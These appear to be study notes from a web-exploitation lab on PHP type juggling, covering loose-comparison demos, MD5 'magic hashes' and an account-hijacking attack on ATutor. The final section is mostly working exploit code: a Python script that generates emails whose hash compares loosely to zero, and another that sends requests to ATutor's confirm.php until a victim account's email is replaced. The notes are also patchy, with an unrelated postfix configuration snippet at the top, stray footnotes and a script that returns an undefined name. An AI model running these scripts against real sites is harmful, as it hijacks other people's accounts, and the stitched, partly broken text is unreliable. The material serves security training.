#### Type Juggling

```
sudo cat /etc/postfix/transport
```
update that file with SMTP relay IP.

```
sudo postmap /etc/postfix/transport
```

PHP does not require (or support) explicit type definition in variable declaration; a variable's type is determined by the context in which the variable is used. That is to say, if a string value is assigned to variable $var, $var becomes a string. If an integer value is then assigned to $var, it becomes an integer.

Loose comparisons

Strict comparisons

(PHP Group, 2020), http://php.net/manual/en/language.types.type-juggling.php ↩︎

2
(PHP Group, 2020), http://php.net/manual/en/language.operators.comparison.php#language.operators.comparison

#### Loose comparison in PHP 5.6.17

```
php -v
php -a
var_dump('0xAAAA' == '43690');
bool(true)

var_dump('0xAAAA' == 43690);
bool(true)

var_dump(0xAAAA == 43690);
bool(true)

var_dump('0xAAAA' == '43691');
bool(false)
```
#### Loose comparison in PHP 8.1.12

```
php -v
php -a
Interactive shell

php > var_dump('0xAAAA' == 43690);
bool(false)
php > var_dump('0xAAAA' == '43690');
bool(false)
php > var_dump(0xAAAA == 43690);
bool(true)
php > var_dump('0xAAAA' == '43691');
bool(false)
php > 

```
#### Scientific exponential notation comparisons in PHP 8.1.12 and PHP 5

```
php -a

php > var_dump('0eAAAA' == '0');
bool(false)
php > var_dump('0e1111' == '0');
bool(true)
php > var_dump('0e9999' == '0');
bool(true)

```

1
(PHP Group, 2020), http://php.net/manual/en/language.types.string.php#language.types.string.conversion ↩︎ ↩︎


#### Magic Hashes

```
student@atutor:~$ php -a
Interactive mode enabled

php > echo md5('240610708');
0e462097431906509019562988736854

php > var_dump('0e462097431906509019562988736854' == '0');
bool(true)

```

(Špaček et al., 2022), https://github.com/spaze/hashes ↩︎ ↩︎

##### ATutor and magic email address

```
└─$ cat atutor_codegen.py 
import hashlib, string, itertools, re, sys

def gen_code(domain, id, date, prefix_length):
    count = 0
    for word in map(''.join, itertools.product(string.ascii_lowercase, repeat=int(prefix_length))):
        #hash = hashlib.md5("%s@%s" % (word.encode('utf-8'), domain.encode('utf-8')) + date.encode('utf-8') + id.encode('utf-8')).hexdigest()[:10]
        hash = hashlib.md5(("%s@%s" % (word, domain) + date + id).encode()).hexdigest()[:10]
        if re.match(r'0+[eE]\d+$', hash):
            print("(+) Found a valid email! %s@%s" % (word, domain))
            print("(+) Requests made: %d" % count)
            print("(+) Equivalent loose comparison: %s == 0\n" % (hash))
        count += 1

def main():
    if len(sys.argv) != 5:
        print('(+) usage: %s <domain_name> <id> <creation_date> <prefix_length>' % sys.argv[0])
        print('(+) eg: %s offsec.local 3 "2018-06-10 23:59:59" 3'  % sys.argv[0])
        sys.exit(-1)

    domain = sys.argv[1]
    id = sys.argv[2]
    creation_date  = sys.argv[3]
    prefix_length = sys.argv[4]

    gen_code(domain, id, creation_date, prefix_length)

if __name__ == "__main__":
    main()



```

```
python atutor_codegen.py offsec.local 1 "2018-05-10 19:28:05" 3
python atutor_codegen.py offsec.local 1 "2018-05-10 19:28:05" 4
```


```
└─$ cat atutor_update_email.py                               
import hashlib, string, itertools, re, sys, requests

def update_email(ip, domain, id, prefix_length):
    count = 0
    for word in map(''.join, itertools.product(string.ascii_lowercase, repeat=int(prefix_length))):
        email = "%s@%s" % (word, domain)
        url = "http://%s/ATutor/confirm.php?e=%s&m=0&id=%s" % (ip, email, id)
        print ("(*) Issuing update request to URL: %s" % url)
        r = requests.get(url, allow_redirects=False)
        if (r.status_code == 302):
            return (True, email, count)
        else:
            count += 1
    return (False, Nothing, count)

def main():
    if len(sys.argv) != 5:
        print ('(+) usage: %s <domain_name> <id> <prefix_length> <atutor_ip>' % sys.argv[0])
        print ('(+) eg: %s offsec.local 1 3 192.168.1.2'  % sys.argv[0])
        sys.exit(-1)

    domain = sys.argv[1]
    id = sys.argv[2]
    prefix_length = sys.argv[3]
    ip = sys.argv[4]

    result, email, c = update_email(ip, domain, id, prefix_length)
    if(result):
        print ("(+) Account hijacked with email %s using %d requests!" % (email, c))
    else:
        print ("(-) Account hijacking failed!")

if __name__ == "__main__":
    main()
              
```

```
python atutor_update_email.py offsec.local 1 3 192.168.121.103
```

